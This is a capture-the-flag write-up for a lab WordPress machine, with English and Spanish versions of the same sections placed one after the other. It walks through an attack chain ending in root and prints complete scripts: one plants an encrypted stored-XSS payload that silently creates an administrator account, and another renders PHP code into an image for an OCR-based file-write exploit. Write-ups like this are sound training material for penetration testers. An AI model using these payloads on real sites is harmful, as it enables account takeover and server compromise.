Exploitation Summary

Exploitation process: The target machine ran a WordPress 7.0 instance over HTTPS on port 443. An exposed uploads directory revealed an audio file containing a hinted password. The audio was very robotic, so after transcribing it and applying some brute-force variations against xmlrpc.php, I obtained valid credentials for the non-admin user jake.

The WordPress theme included a unique voice recording tool. Analyzing its JavaScript, I found a hardcoded symmetric ENCRYPTION_KEY and two AJAX actions: save_voice_raw and save_voice_results. By encrypting a malicious payload with that key and storing it as the "transcription" and "summary" of a recording, I achieved stored XSS that fired when an admin viewed the recordings page. I used a CSRF-style JavaScript payload to create a new WordPress administrator account through /wp-admin/user-new.php.

With admin access, I uploaded a malicious plugin containing a PHP webshell, obtained code execution, and launched a reverse shell. Inside wp-config.php I found reused credentials for the user walter, which granted me the user flag.

For privilege escalation, root ran a PHP OCR web app on 127.0.0.1:8001 that used tesseract to recognize text from uploaded images and could save the OCR output to an arbitrary filename. Since the app was PHP and allowed arbitrary extensions, I crafted an image containing PHP code (<?php ... ?>), had the OCR engine "recognize" it, and saved the output as a .php file in the web root — achieving RCE as root. The final payload set the SUID bit on /bin/bash.

Technologies/Exploits: WordPress XMLRPC brute force, stored XSS via encrypted payload, CSRF-style admin user creation, malicious plugin webshell, credential reuse, OCR/tesseract PHP file write RCE (CVE-2026-26832).

From XSS to Admin User Creation

The idea now is to generate a payload that points to my server to detect anyone visiting the page. I follow the same process but change the payload to a callback to my server — but since it's not HTTPS, it gets blocked. An HTTPS request won't work either because the self-signed certificate isn't trusted and HTB machines have no internet access.

So I focus directly on a CSRF-style payload to create an admin user if the admin visits the page. I write this script that does the whole process in one shot:

import json, base64, os, wave, struct, requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Config
TARGET = "https://makesense.htb/wp-admin/admin-ajax.php"
COOKIE = "wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"
NONCE = "6f1ad8954c"
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

XSS = """<script>fetch('/wp-admin/user-new.php').then(r=>r.text()).then(html=>{const n=html.match(/_wpnonce_create-user" value="([^"]+)"/)[1];fetch('/wp-admin/user-new.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createuser&_wpnonce_create-user='+n+'&user_login=asd&email=asd@asd.com&pass1=Asd123!&pass2=Asd123!&role=administrator&noconfirmation=1'})})</script>"""

# Step 0 - create dummy wav
wav_path = '/tmp/dummy.wav'
with wave.open(wav_path, 'w') as f:
    f.setnchannels(1)
    f.setsampwidth(2)
    f.setframerate(16000)
    f.writeframes(struct.pack('<h', 0) * 16000)
print("[*] Dummy wav created")

# Step 1 - encrypt payload
digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
digest.update(ENCRYPTION_KEY.encode())
key_bytes = digest.finalize()

payload = {"transcription": XSS, "summary": XSS}
data = json.dumps(payload).encode()
iv = os.urandom(12)
aesgcm = AESGCM(key_bytes)
encrypted = aesgcm.encrypt(iv, data, None)
encrypted_payload = base64.b64encode(iv + encrypted).decode()
print("[*] Payload encrypted")

# Step 2 - upload wav, get post_id
session = requests.Session()
session.verify = False
session.cookies.set(
    COOKIE.split('=')[0],
    '='.join(COOKIE.split('=')[1:])
)

r1 = session.post(TARGET, data={
    "action": "save_voice_raw",
    "nonce": NONCE
}, files={
    "voice_recording": ("voice-message.wav", open(wav_path, 'rb'), "audio/wav")
})
post_id = r1.json()['data']['post_id']
print(f"[*] Post created: {post_id}")

# Step 3 - send forged encrypted payload
r2 = session.post(TARGET, data={
    "action": "save_voice_results",
    "nonce": NONCE,
    "post_id": post_id,
    "encrypted_payload": encrypted_payload
})
print(f"[*] Results: {r2.json()}")
print(f"\n[+] Done! Check submission #{post_id} in WP admin")

Included in this script is the XSS payload that first grabs the required nonce in one request, then in a second request creates the new administrator user by targeting /wp-admin/user-new.php with this body:

user_login=asd&email=asd@asd.com&pass1=Asd123!&pass2=Asd123!&role=administrator&noconfirmation=1

After a while I check that the user has been created, and I can log into the admin panel.

Crafting the PHP Image Payload

Since the web is PHP, it occurs to me to write PHP text and save a .php file, given that I can set the extension however I want. Doing it manually in the browser is a bit tedious, so I use a simple AI-assisted script to do exactly that — draw PHP code into an image:

from PIL import Image, ImageDraw, ImageFont
import base64
import urllib.parse

payload = "<?php system('id'); ?>"

img = Image.new('RGB', (1000, 300), color='white')
d = ImageDraw.Draw(img)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 40)
except:
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
    except:
        font = ImageFont.load_default()

d.text((50, 100), payload, fill='black', font=font)
img.save('/tmp/payload_clean.png')

with open('/tmp/payload_clean.png', 'rb') as f:
    b64 = base64.b64encode(f.read()).decode()

data_url = f"data:image/png;base64,{b64}"
encoded = urllib.parse.quote(data_url)
print(encoded)

What I'll do is capture with Burp Suite the two requests that get sent — one to submit the image, another to create the file — and replay the first request with the image this script generates. Then the OCR ID can be found in an input in the HTML, so I can recover it to make the second request.

Resumen de Explotación

Proceso de explotación: La máquina objetivo ejecutaba una instancia de WordPress 7.0 sobre HTTPS en el puerto 443. Un directorio de uploads expuesto revelaba un archivo de audio que contenía una pista de contraseña. El audio era muy robótico, así que tras transcribirlo y aplicar variaciones por fuerza bruta contra xmlrpc.php, obtuve credenciales válidas para el usuario no administrador jake.

El tema de WordPress incluía una herramienta única de grabación de voz. Analizando su JavaScript, encontré una ENCRYPTION_KEY simétrica hardcodeada y dos acciones AJAX: save_voice_raw y save_voice_results. Cifrando un payload malicioso con esa clave y guardándolo como "transcription" y "summary" de una grabación, conseguí un XSS almacenado que se disparaba cuando un administrador visitaba la página de grabaciones. Usé un payload JavaScript estilo CSRF para crear una nueva cuenta de administrador de WordPress mediante /wp-admin/user-new.php.

Con acceso de administrador, subí un plugin malicioso con una webshell PHP, obtuve ejecución de código y lancé una reverse shell. Dentro de wp-config.php encontré credenciales reutilizadas del usuario walter, que me dieron la flag de usuario.

Para la escalada de privilegios, root ejecutaba una aplicación web PHP de OCR en 127.0.0.1:8001 que usaba tesseract para reconocer texto de imágenes subidas y podía guardar la salida del OCR en un nombre de archivo arbitrario. Dado que la app era PHP y permitía extensiones arbitrarias, creé una imagen con código PHP (<?php ... ?>), hice que el motor OCR la "reconociese" y guardé la salida como un archivo .php en el web root — logrando RCE como root. El payload final puso el bit SUID a /bin/bash.

Tecnologías/Exploits: Fuerza bruta contra XMLRPC de WordPress, XSS almacenado mediante payload cifrado, creación de usuario admin estilo CSRF, webshell mediante plugin malicioso, reutilización de credenciales, RCE por escritura de archivo PHP vía OCR/tesseract (CVE-2026-26832).

La Herramienta de Voz - A la Caza del XSS

Cambiando un poco el enfoque, me centro en la herramienta de voz que presenta el WordPress, que es algo único. En el source de la página encuentro que carga estos JS:

<script id="whisper-wrapper-js" src="https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js?ver=1.0"></script>

Nada más ver el archivo veo una clave de encriptación en una constante, lo que llama la atención inmediatamente y puede ser un indicador de que puede haber otros errores:

Del XSS a la Creación del Usuario Admin

La idea ahora es generar un payload que apunte a mi servidor para ver si hay alguien visitando la página. Sigo el mismo proceso pero cambio el payload a un callback a mi servidor, pero al no ser HTTPS lo bloquea. Un request HTTPS tampoco funcionará porque no confiará en un certificado autofirmado y las máquinas de HTB no tienen acceso a internet.

Así que me voy a centrar directamente en el payload estilo CSRF para intentar que, si el admin visita la web, se cree un usuario. Genero este script que hace todo el proceso de una tirada:

import json, base64, os, wave, struct, requests
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend

# Config
TARGET = "https://makesense.htb/wp-admin/admin-ajax.php"
COOKIE = "wordpress_logged_in_666f3cbf9610031df176da93aa83bc38=jake|1783788348|CoQ7uPIIxfjzy4WFHNsDuNrBJMwav28Y9vKYEynGyNr|660717170898f7c324bbeec48d484ae44e1ba1ace6e2e58fe6bf769e860c9919"
NONCE = "6f1ad8954c"
ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

XSS = """<script>fetch('/wp-admin/user-new.php').then(r=>r.text()).then(html=>{const n=html.match(/_wpnonce_create-user" value="([^"]+)"/)[1];fetch('/wp-admin/user-new.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'action=createuser&_wpnonce_create-user='+n+'&user_login=asd&email=asd@asd.com&pass1=Asd123!&pass2=Asd123!&role=administrator&noconfirmation=1'})})</script>"""

# Step 0 - create dummy wav
wav_path = '/tmp/dummy.wav'
with wave.open(wav_path, 'w') as f:
    f.setnchannels(1)
    f.setsampwidth(2)
    f.setframerate(16000)
    f.writeframes(struct.pack('<h', 0) * 16000)
print("[*] Dummy wav created")

# Step 1 - encrypt payload
digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
digest.update(ENCRYPTION_KEY.encode())
key_bytes = digest.finalize()

payload = {"transcription": XSS, "summary": XSS}
data = json.dumps(payload).encode()
iv = os.urandom(12)
aesgcm = AESGCM(key_bytes)
encrypted = aesgcm.encrypt(iv, data, None)
encrypted_payload = base64.b64encode(iv + encrypted).decode()
print("[*] Payload encrypted")

# Step 2 - upload wav, get post_id
session = requests.Session()
session.verify = False
session.cookies.set(
    COOKIE.split('=')[0],
    '='.join(COOKIE.split('=')[1:])
)

r1 = session.post(TARGET, data={
    "action": "save_voice_raw",
    "nonce": NONCE
}, files={
    "voice_recording": ("voice-message.wav", open(wav_path, 'rb'), "audio/wav")
})
post_id = r1.json()['data']['post_id']
print(f"[*] Post created: {post_id}")

# Step 3 - send forged encrypted payload
r2 = session.post(TARGET, data={
    "action": "save_voice_results",
    "nonce": NONCE,
    "post_id": post_id,
    "encrypted_payload": encrypted_payload
})
print(f"[*] Results: {r2.json()}")
print(f"\n[+] Done! Check submission #{post_id} in WP admin")

Creación del Payload de Imagen PHP

Viendo que la web es PHP, se me ocurre escribir un texto PHP y guardar un archivo .php, ya que he visto que me permite poner extensiones como quiera. Pero quizá es algo pesado hacerlo manualmente en el buscador, así que voy a usar un script simple con IA para que haga exactamente eso — dibujar código PHP en una imagen:

from PIL import Image, ImageDraw, ImageFont
import base64
import urllib.parse

payload = "<?php system('id'); ?>"

img = Image.new('RGB', (1000, 300), color='white')
d = ImageDraw.Draw(img)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf", 40)
except:
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 40)
    except:
        font = ImageFont.load_default()

d.text((50, 100), payload, fill='black', font=font)
img.save('/tmp/payload_clean.png')

with open('/tmp/payload_clean.png', 'rb') as f:
    b64 = base64.b64encode(f.read()).decode()

data_url = f"data:image/png;base64,{b64}"
encoded = urllib.parse.quote(data_url)
print(encoded)

Lo que haré es recoger con Burp Suite los 2 requests que se envían, uno para enviar la imagen y otro para crear el archivo, y hacer un replay del primer request con la imagen que me genere este script. Luego el OCR ID se puede encontrar en un input en el HTML y podré recuperarlo para hacer la segunda petición.
